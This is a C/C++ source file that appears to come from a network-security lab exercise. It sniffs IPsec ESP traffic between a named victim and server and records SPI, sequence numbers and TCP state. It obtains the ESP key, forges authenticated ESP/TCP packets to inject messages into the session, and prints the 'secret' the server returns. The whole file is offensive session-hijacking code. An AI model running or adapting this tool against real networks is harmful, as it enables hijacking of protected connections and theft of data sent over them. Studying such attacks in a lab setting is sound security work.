#include "replay.h"

#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#include "dev.h"
#include "esp.h"
#include "hmac.h"
#include "net.h"
#include "transport.h"

frame_arr frame_buf;

void tx_esp_rep(Dev dev, Net net, Esp esp, Txp txp, uint8_t* data, ssize_t dlen,
                long msec) {
    size_t nb = dlen;

    txp.plen = dlen;
    txp.fmt_rep(net.ip4hdr, data, nb);
    nb += sizeof(tcphdr);

    esp.plen = nb;
    esp.fmt_rep(TCP);
    esp.set_padpl();
    memcpy(esp.pl.data(), &txp.thdr, txp.hdrlen);
    memcpy(esp.pl.data() + txp.hdrlen, txp.pl.data(), txp.plen);
    esp.set_auth(hmac_sha1_96);
    nb +=
        sizeof(EspHeader) + sizeof(EspTrailer) + esp.tlr.pad_len + esp.authlen;

    net.plen = nb;
    net.fmt_rep();

    dev.fmt_frame(net, esp, txp);

    dev.tx_frame();
}

ssize_t send_msg(Dev* dev, Net* net, Esp* esp, Txp* txp, char* str) {
    if (!dev || !net || !esp || !txp) {
        fprintf(stderr, "Invalid arguments of %s.\n", __func__);
        return -1;
    }

    ssize_t nb;
    uint8_t buf[BUFSIZE];

    if (str != NULL) {
        int i;
        int len = strlen(str);
        for (i = 0; i < len; i++) {
            buf[i] = static_cast<uint8_t>(str[i]);
        }
        buf[i] = static_cast<uint8_t>('\r');
        buf[i + 1] = static_cast<uint8_t>('\n');
        nb = len + 1;
    } else {
        nb = 0;
    }

    tx_esp_rep(*dev, *net, *esp, *txp, buf, nb, 0);

    return nb;
}

/**
 * parse receive data and print secret if get one
 */
bool dissect_rx_data(Dev* dev, Net* net, Esp* esp, Txp* txp, int* state,
                     char* victim_ip, char* server_ip, bool* test_for_dissect) {
    uint8_t* net_data = net->dissect(dev->frame.data() + LINKHDRLEN,
                                     dev->framelen - LINKHDRLEN);

    if (net->pro == ESP) {
        uint8_t* esp_data = esp->dissect(net_data, net->plen);

        uint8_t* txp_data = txp->dissect(net, esp_data, esp->plen);

        if (txp->thdr.psh) {
            if (*test_for_dissect) {
                *test_for_dissect = false;
                puts("you can start to send the message...");
            }

            if (txp_data != NULL && txp->thdr.psh && *state == WAIT_SECRET &&
                strcmp(victim_ip, net->dst_ip.data()) == 0 &&
                strcmp(server_ip, net->src_ip.data()) == 0) {
                puts("get secret: ");
                write(1, txp_data, txp->plen);
                puts("");
                *state = SEND_ACK;
            }
            return true;
        }
    }
    return false;
}

/**
 * @returns Dev::frame.data()
 */
uint8_t* wait(Dev* dev, Net* net, Esp* esp, Txp* txp, int* state,
              char* victim_ip, char* server_ip, bool* test_for_dissect) {
    bool dissect_finish = false;

    while (!dissect_finish) {
        dev->framelen = dev->rx_frame();
        dissect_finish = dissect_rx_data(dev, net, esp, txp, state, victim_ip,
                                         server_ip, test_for_dissect);
    }

    return dev->frame.data();
}

void record_txp(Net* net, Esp* esp, Txp* txp) {
    extern EspHeader esp_hdr_rec;

    if (net->pro == ESP &&
        strcmp(net->x_src_ip.data(), net->src_ip.data()) == 0) {
        esp_hdr_rec.spi = esp->hdr.spi;
        esp_hdr_rec.seq = ntohl(esp->hdr.seq);
    }

    if (strcmp(net->x_src_ip.data(), net->src_ip.data()) == 0) {
        txp->x_tx_seq = ntohl(txp->thdr.th_seq) + txp->plen;
        txp->x_tx_ack = ntohl(txp->thdr.th_ack);
        txp->x_src_port = ntohs(txp->thdr.th_sport);
        txp->x_dst_port = ntohs(txp->thdr.th_dport);
    }

    if (strcmp(net->x_src_ip.data(), net->dst_ip.data()) == 0) {
        txp->x_tx_seq = ntohl(txp->thdr.th_ack);
        txp->x_tx_ack = ntohl(txp->thdr.th_seq) + txp->plen;
        txp->x_src_port = ntohs(txp->thdr.th_dport);
        txp->x_dst_port = ntohs(txp->thdr.th_sport);
    }
}

void get_info(Dev* dev, Net* net, Esp* esp, Txp* txp, int* state,
              char* victim_ip, char* server_ip, bool* test_for_dissect) {
    extern EspHeader esp_hdr_rec;

    wait(dev, net, esp, txp, state, victim_ip, server_ip, test_for_dissect);

    if (*state != SEND_ACK) {
        memcpy(dev->linkhdr.data(), dev->frame.data(), LINKHDRLEN);

        strcpy(net->x_src_ip.data(), net->src_ip.data());
        strcpy(net->x_dst_ip.data(), net->dst_ip.data());

        txp->x_src_port = ntohs(txp->thdr.th_sport);
        txp->x_dst_port = ntohs(txp->thdr.th_dport);

        record_txp(net, esp, txp);
        esp_hdr_rec.spi = esp->hdr.spi;
        esp->get_key();
    }
}
